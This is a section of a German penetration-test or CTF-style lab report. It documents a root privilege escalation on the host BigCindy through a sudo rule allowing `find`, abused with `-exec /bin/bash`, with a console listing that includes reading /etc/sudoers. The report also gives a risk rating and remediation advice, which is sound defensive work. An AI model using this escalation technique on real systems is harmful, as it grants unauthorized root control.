\section{Schwachstelle 9: Local-Privilege-Escalation aufgrund Fehlkonfiguration bei BigCindy}
\label{sec:vuln9}
Aufgrund einer Fehlkonfiguration der SUDO-Berechtigungen, ist es einem angemeldeten Angreifer möglich seine Berechtigungen auszuweiten.

\subsection{Wegbeschreibung der Schwachstelle}
\label{subsec:vuln9_way}


Textauszug \ref{lst:vuln9_escalate} zeigt, anhand des in \texttt{sudo -l} gelisteten Programms \texttt{find}, die Ausweitung der Berechtigungen aufgrund des \texttt{-exec "{}/bin/bash"{}}-Parameters ermöglicht wird.

\lstset{language=bash,caption={Ausweiten der Berechtigung anhand der Ausnutzung des \texttt{exec}-Parmeters des \texttt{find}-Programms}, label=lst:vuln9_escalate}
\begin{lstlisting}[frame=single, firstnumber=1, stepnumber=1,]
myron@bigcindy:~$ sudo -l
sudo -l
Matching Defaults entries for myron on bigcindy:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User myron may run the following commands on bigcindy:
    (root) /usr/bin/find
myron@bigcindy:~$ 

myron@bigcindy:~$ sudo /usr/bin/find /usr/bin/find -exec "whoami" \;
sudo /usr/bin/find test -exec "whoami" \;
root
myron@bigcindy:~$ sudo /usr/bin/find /usr/bin/find -exec "/bin/bash" \;
sudo /usr/bin/find test -exec "/bin/bash" \;
                                      === Flag 7 === 

WHO ARE YOU? WHAT ARE YOU DOING ON MY SHIP?

 ...

WE DON'T ALLOW HITCHHIKERS ON OUR SHIPS...

 ...

STOP COMPLAINING. There's no point in acting all surprised about it. All the
planning charts and demolition orders have been on display in your local 
planning department in Alpha Centauri for fifty of your Earth years, so you've
had plenty of time to lodge any formal complaint and it's far too late to start
making a fuss about it now.

 ...

YOU'LL BE SPACED IMMEDIATELY. BUT FIRST, SOME OF MY PERSONAL POETRY:

Oh freddled gruntbuggly,
Thy micturations are to me, (with big yawning)
As plurdled gabbleblotchits, in midsummer morning
On a lurgid bee,
That mordiously hath blurted out,
Its earted jurtles, grumbling
Into a rancid festering confectious organ squealer. [drowned out by moaning and screaming]
Now the jurpling slayjid agrocrustles,
Are slurping hagrilly up the axlegrurts,
And living glupules frart and stipulate,
Like jowling meated liverslime,
Groop, I implore thee, my foonting turlingdromes,
And hooptiously drangle me,
With crinkly bindlewurdles,mashurbitries.
Or else I shall rend thee in the gobberwarts with my blurglecruncheon,
See if I don't!

THANK YOU FOR LISTENING. THERE STILL MIGHT BE HOPE FOR YOU.
Guard! Throw it out of the airlock and bring me my lunch.


            o               .        ___---___                    .                   
                   .              .--\        --.     .     .         .
                                ./.;_.\     __/~ \.     
                                /;  / `-'  __\    . \                            
              .        .       / ,--'     / .   .;   \        |
                              | .|       /       __   |      -O-       .
             .               |__/    __ |  . ;   \ | . |      |
                             |      /  \\_    . ;| \___|    
                .    o       |      \  .~\\___,--'     |           .
                              |     | . ; ~~~~\_    __|
                 |             \    \   .  .  ; \  /_/   .
                -O-        .    \   /         . |  ~/                  .
                 |    .          ~\ \   .      /  /~          o
               .                   ~--___ ; ___--~       
             .      .         .          ---         .              



                                 === mbr_vogon_poetry ===
root@bigcindy:/home/myron# cat /etc/sudoers
cat /etc/sudoers
#
# This file MUST be edited with the 'visudo' command as root.
#
# Please consider adding local content in /etc/sudoers.d/ instead of
# directly modifying this file.
#
# See the man page for details on how to write a sudoers file.
#
Defaults        env_reset
Defaults        mail_badpass
Defaults        secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"

# Host alias specification

# User alias specification

# Cmnd alias specification

# User privilege specification
root    ALL=(ALL:ALL) ALL
myron   ALL=(root) /usr/bin/find 

# Allow members of group sudo to execute any command
%sudo   ALL=(ALL:ALL) ALL

# See sudoers(5) for more information on "#include" directives:

#includedir /etc/sudoers.d

\end{lstlisting} 

Die Ausgabe von \texttt{cat /etc/sudoers} (Zeile 76 ff.) zeigt die vulnerable Konfiguration. So kann der Benutzer \texttt{myron} den Befehl \texttt{/usr/bin/find} mit den Rechten des \texttt{root}-Benutzers ausführen.

\subsection{Risikobewertung}
Zur Ausnutzung der Schwachstelle muss der Benutzer \texttt{myron} am System \texttt{BigCindy} angemeldet sein. Unter Beachtung der zuvor dargestellten Schwachstellen muss ein externer Angreifer Schwachstelle 1, 3 und 7 ausgenutzt haben. Die Eintrittswahrscheinlichkeit ist daher als MITTEL angegeben. Die Schadenshöhe ist aufgrund der Erreichung von Root-Berechtigungen als HOCH eingeschätzt worden.

Das Gesamtrisiko wurde daher mit \textcolor{red}{HOCH} bewertet.

\subsection{Empfohlene Gegenmaßnahmen}
Es sollte geprüft werden, ob für \texttt{find} eine Sudo-Berechtigung zwingend nötig ist. Sofern das Programm \texttt{find} für den Benutzer \texttt{myron} nicht unter Root-Berechtigungen ausgeführt werden muss, so sollte die \texttt{sudo}-Berechtigung entfernt werden. Anderenfalls sollte eine Alternative zu dem mächtigen \texttt{find}-Programm verwendet werden. Zum Beispiel eignet sich das Programm \texttt{fd}\footnote{fd: siehe \url{https://github.com/sharkdp/fd}} für die Ausführung mit erweiterten Rechten. 

\subsection{Hinterlassene Spuren und Spurenbeseitigung}
Es wurden keine Dateien geändert, hinzugefügt oder Prozesse gestartet.


